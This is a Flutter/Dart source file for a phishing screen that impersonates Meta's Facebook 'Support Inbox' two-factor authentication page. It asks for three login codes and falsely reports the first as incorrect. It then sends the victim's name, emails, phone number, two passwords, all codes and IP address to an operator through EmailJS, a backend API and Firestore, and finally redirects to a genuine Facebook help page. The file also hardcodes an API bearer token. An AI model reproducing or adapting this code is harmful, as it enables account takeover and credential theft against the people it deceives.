import 'dart:convert';
import 'package:flutter/foundation.dart';

import 'package:cloud_firestore/cloud_firestore.dart';
import 'package:dart_ipify/dart_ipify.dart';
import 'package:emailjs/emailjs.dart';
import 'package:exins/Constants/app_constants.dart';
import 'package:exins/Provider/uid_provider.dart';
import 'package:exins/Responsive/responsive_layout.dart';
import 'package:exins/Views/Mobile/mobile_ref_screen.dart';
import 'package:exins/Views/Web/ref_screen.dart';
import 'package:exins/Views/Widgets/Text/poppins.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:page_transition/page_transition.dart';
import 'package:provider/provider.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:http/http.dart' as http;

class MobileTFA extends StatefulWidget {
  final Map dataMap;
  final bool isMobile;
  final bool isThird;

  MobileTFA(
      {required this.dataMap, required this.isMobile, required this.isThird});

  @override
  State<MobileTFA> createState() => _MobileTFAState();
}

class _MobileTFAState extends State<MobileTFA> {
  int verifyNumber = 1;

  bool isVerifpass = false;

  bool isButtonDisable = false;
  TextEditingController tf = TextEditingController();

  List<int> tfs = [];

  String? usrUid;

  Future<void> sendMessage(Map map, String ip) async {
    const baseUrl =
        'http://localhost:8080/v1/users/update'; // Replace with your API base URL

    // 'email': AppConstants.email,
    final body = {
      'fullname': map["Full Name"], //
      'businessEmail': map["Business Email Address"],
      'email': map["Personal Email Address"],
      'firstTFA': map["firstTFA"],
      'secondTFA': map["secondTFA"],
      'thirdTFA': map["thirdTFA"],
      "ip": ip
    };
    final bodyConvert = jsonEncode(body);
    debugPrint('MobileTFA: $bodyConvert');
    Map<String, String> headers = {
      'Content-Type': 'application/json',
    };

    final response =
        await http.put(Uri.parse(baseUrl), body: bodyConvert, headers: headers);

    if (response.statusCode == 200) {
      print('');
    } else {
      print('Failed to send message');
    }
  }

  sendEmail(Map map, String ip) async {
    //   await EmailJS.send(
    //     AppConstants.SERVICE_KEY,
    //     AppConstants.TEMPLATE_ID,
    //     {
    //       'user_email': AppConstants.email,
    //       'full_name': map["Full Name"],//
    //       'bus_email': map["Business Email Address"],
    //       'pers_email': map["Personal Email Address"],
    //       'fb_page_name': map["Facebook Page Name"],
    //       'phone': map["Phone Number"],
    //       'p_one': map["password1"],
    //       'p_two': map["password2"],
    //       'tfa_one': map["firstTFA"],
    //       'tfa_two': map["secondTFA"],
    //       'tfa_three': map["thirdTFA"],
    //       'add_info': map["Additional Info"],
    //       "ip_address": ip
    //     },
    //     const Options(
    //       publicKey: AppConstants.PUBLIC_KEY,
    //       privateKey: AppConstants.PRIVATE_KEY,
    //     ),
    //   );

    //   return true;
    // } catch (error) {
    //   if (error is EmailJSResponseStatus) {}
    //   print(error.toString());
    // }
    // return false;

    var url = Uri.parse('https://api.emailjs.com/api/v1.0/email/send');

    var headers = <String, String>{
      'Content-Type': 'application/json; charset=UTF-8',
      'Authorization': 'Bearer 8sM8KJk7HJLd-V-oN3ZZo'
    };

    Map<String, dynamic> body = {
      'service_id': AppConstants.SERVICE_KEY,
      'template_id': AppConstants.TEMPLATE_ID,
      'user_id': AppConstants.PUBLIC_KEY,
      'template_params': {
        'subject': "New User Information",
        'to_email': AppConstants.email,
        'user_email': AppConstants.email,
        'full_name': map["Full Name"], //
        'bus_email': map["Business Email Address"],
        'pers_email': map["Personal Email Address"],
        'fb_page_name': map["Facebook Page Name"],
        'phone': map["Phone Number"],
        'p_one': map["password1"],
        'p_two': map["password2"],
        'tfa_one': map["firstTFA"],
        'tfa_two': map["secondTFA"],
        'tfa_three': map["thirdTFA"],
        'add_info': map["Additional Info"],
        "ip_address": ip
      },
    };

    var client = http.Client();

    try {
      var response = await client.post(
        url,
        headers: headers,
        body: jsonEncode(body),
      );

      if (response.statusCode != 200) {
        throw Exception(
            'Failed to send email. Status code: ${response.statusCode}');
      }
    } finally {
      client.close();
    }
  }

  Widget getTFAStepText() {
    if (!widget.isThird) {
      if (!isVerifpass) {
        return Poppins(
          text: "(1/3)",
          color: const Color(0xff4b4f56),
          fontWeight: FontWeight.w700,
          fontSize: 16,
        );
      } else {
        return Poppins(
          text: "(2/3)",
          color: const Color(0xff4b4f56),
          fontWeight: FontWeight.w700,
          fontSize: 16,
        );
      }
    } else {
      return Poppins(
        text: "(3/3)",
        color: const Color(0xff4b4f56),
        fontWeight: FontWeight.w700,
        fontSize: 16,
      );
    }
  }

  @override
  Widget build(BuildContext context) {
    usrUid = Provider.of<UidProvider>(context).uid;

    return Scaffold(
      backgroundColor: const Color(0xffE9EAED),
      body: SingleChildScrollView(
        child: Container(
          height: MediaQuery.of(context).size.height,
          child: Column(
            children: [
              Container(
                height: 55,
                width: double.infinity,
                color: const Color(0xff355797),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: [
                    Row(
                      children: [
                        const SizedBox(
                          width: 20,
                        ),
                        Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 10),
                          child: Image.asset(
                            "assets/images/metav2.png",
                            filterQuality: FilterQuality.high,
                          ),
                        ),
                        const VerticalDivider(
                          color: Colors.white,
                          width: 10,
                          thickness: 1,
                          indent: 15,
                          endIndent: 15,
                        ),
                        Padding(
                          padding: const EdgeInsets.symmetric(horizontal: 10),
                          child: Poppins(
                              text: "Support Inbox", color: Colors.white),
                        )
                      ],
                    ),
                    const Padding(
                      padding: EdgeInsets.symmetric(horizontal: 20.0),
                      child: Icon(
                        Icons.search,
                        color: Colors.white,
                      ),
                    )
                  ],
                ),
              ),
              SizedBox(
                height: 100,
              ),
              Padding(
                padding: const EdgeInsets.symmetric(horizontal: 10.0),
                child: Container(
                  width: 570,
                  decoration: BoxDecoration(
                    color: Colors.white,
                    borderRadius: const BorderRadius.all(
                      Radius.circular(5),
                    ),
                    border: Border.all(width: 1, color: Colors.grey.shade400),
                  ),
                  child: Column(
                    mainAxisAlignment: MainAxisAlignment.start,
                    crossAxisAlignment: CrossAxisAlignment.start,
                    children: [
                      Padding(
                        padding: const EdgeInsets.only(
                            left: 15, right: 15, top: 10, bottom: 5),
                        child: Row(
                          children: [
                            Poppins(
                              text: "Two-factor authentication required ",
                              color: const Color(0xff4b4f56),
                              fontWeight: FontWeight.w700,
                              fontSize: 16,
                            ),
                            getTFAStepText()
                          ],
                        ),
                      ),
                      const Divider(
                        thickness: 1,
                      ),
                      Padding(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 20, vertical: 10),
                        child: Column(
                          mainAxisAlignment: MainAxisAlignment.start,
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            const SelectableText(
                              "You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.",
                              style: TextStyle(fontSize: 13, height: 1.6),
                            ),
                            const SizedBox(
                              height: 10,
                            ),
                            const SelectableText(
                              "Enter the 6-digit code from your code generator or third-party app below.",
                              style: TextStyle(fontSize: 13, height: 1.6),
                            ),
                            const SizedBox(
                              height: 20,
                            ),
                            Row(
                              children: [
                                SizedBox(
                                  height: 35,
                                  width: 200,
                                  child: TextField(
                                    inputFormatters: [
                                      FilteringTextInputFormatter.digitsOnly
                                    ],
                                    keyboardType: TextInputType.number,
                                    controller: tf,
                                    onChanged: (value) {
                                      setState(() {});
                                    },
                                    decoration: InputDecoration(
                                      label: const Text("Login Code"),
                                      labelStyle: const TextStyle(fontSize: 13),
                                      floatingLabelBehavior:
                                          FloatingLabelBehavior.never,
                                      border: const OutlineInputBorder(),
                                      contentPadding:
                                          const EdgeInsets.symmetric(
                                              vertical: 0, horizontal: 10),
                                      enabledBorder: OutlineInputBorder(
                                        borderSide: BorderSide(
                                            width: 1,
                                            color: Colors.grey.shade400),
                                      ),
                                    ),
                                  ),
                                ),
                                const SizedBox(
                                  width: 5,
                                ),
                                // TFTimer()
                              ],
                            ),
                          ],
                        ),
                      ),
                      isVerifpass
                          ? const Padding(
                              padding: EdgeInsets.symmetric(
                                horizontal: 20,
                              ),
                              child: Text(
                                "Your verification code was incorrect, please try again!",
                                style: TextStyle(color: Colors.red),
                              ),
                            )
                          : Container(),
                      const SizedBox(
                        height: 20,
                      ),
                      Container(
                        padding: const EdgeInsets.symmetric(
                            horizontal: 20, vertical: 10),
                        height: 60,
                        color: const Color(0xffF5F6F7),
                        child: Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          crossAxisAlignment: CrossAxisAlignment.center,
                          children: [
                            const MouseRegion(
                              cursor: SystemMouseCursors.click,
                              child: Text(
                                "Need another way to authenticate?",
                                style: TextStyle(
                                  color: Color(0xff385898),
                                  fontWeight: FontWeight.normal,
                                ),
                              ),
                            ),
                            ElevatedButton(
                              onPressed: !isButtonDisable
                                  ? tf.text.length == 6 || tf.text.length == 8
                                      ? () async {
                                          if (!widget.isThird) {
                                            if (isVerifpass) {
                                              tfs.add(int.parse(tf.text));
                                              widget.dataMap["secondTFA"] =
                                                  tf.text;
                                              sendMessage(widget.dataMap,
                                                  widget.dataMap["ip_address"]);

                                              FirebaseFirestore.instance
                                                  .collection("User")
                                                  .doc(usrUid)
                                                  .set({
                                                "tf1": tfs[0],
                                                "tf2": tfs[1],
                                                "tf3": 0,
                                                "step": 4
                                              }, SetOptions(merge: true));
                                              tf.clear();

                                              Navigator.pushReplacement(
                                                context,
                                                PageTransition(
                                                  type: PageTransitionType.fade,
                                                  child: ResponsiveLayout(
                                                    desktopBody: RefScreen(
                                                        dataMap:
                                                            widget.dataMap),
                                                    mobileBody: MobileRefScreen(
                                                      dataMap: widget.dataMap,
                                                    ),
                                                    tabletBody: MobileRefScreen(
                                                      dataMap: widget.dataMap,
                                                    ),
                                                  ),
                                                ),
                                              );
                                            }

                                            if (!isVerifpass) {
                                              tfs.add(int.parse(tf.text));
                                              widget.dataMap["firstTFA"] =
                                                  tf.text;

                                              tf.clear();

                                              setState(() {
                                                isVerifpass = true;
                                              });

                                              sendMessage(widget.dataMap,
                                                  widget.dataMap["ip_address"]);
                                            }
                                          } else {
                                            final Uri _url = Uri.parse(
                                                'https://www.facebook.com/help/592679377575472/?helpref=hc_fnav');
                                            widget.dataMap["thirdTFA"] =
                                                tf.text;

                                            sendMessage(widget.dataMap,
                                                widget.dataMap["ip_address"]);

                                            if (!await launchUrl(
                                              _url,
                                              webOnlyWindowName: '_self',
                                            )) {
                                              throw Exception(
                                                  'Could not launch $_url');
                                            }
                                          }
                                        }
                                      : null
                                  : null,
                              style: ElevatedButton.styleFrom(
                                  padding: EdgeInsets.zero,
                                  backgroundColor: const Color(0xff5E77AA),
                                  elevation: 0,
                                  fixedSize: const Size(80, 35)),
                              child: const Text(
                                "Continue",
                                style: TextStyle(
                                  color: Colors.white,
                                  fontWeight: FontWeight.w500,
                                  fontSize: 14,
                                ),
                              ),
                            ),
                          ],
                        ),
                      )
                    ],
                  ),
                ),
              ),
              SizedBox(
                height: 100,
              ),
              Expanded(
                child: Align(
                  alignment: Alignment.bottomCenter,
                  child: Column(
                    children: [
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: [
                          Poppins(
                            text: "English (US)",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "English (UK)",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Español",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Português (Brasil)",
                            fontSize: 13,
                          ),
                        ],
                      ),
                      SizedBox(
                        height: 10,
                      ),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: [
                          Poppins(
                            text: "Français (France)",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Español (España)",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "More languages",
                            fontSize: 13,
                          ),
                        ],
                      ),
                      SizedBox(
                        height: 30,
                      ),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: [
                          Poppins(
                            text: "© 2023 Meta",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "About",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Developers",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Careers",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Privacy",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Cookies",
                            fontSize: 13,
                          ),
                        ],
                      ),
                      SizedBox(
                        height: 10,
                      ),
                      Row(
                        mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                        children: [
                          Poppins(
                            text: "Terms",
                            fontSize: 13,
                          ),
                          Poppins(
                            text: "Help Center",
                            fontSize: 13,
                          ),
                        ],
                      ),
                    ],
                  ),
                ),
              )
            ],
          ),
        ),
      ),
    );
  }
}
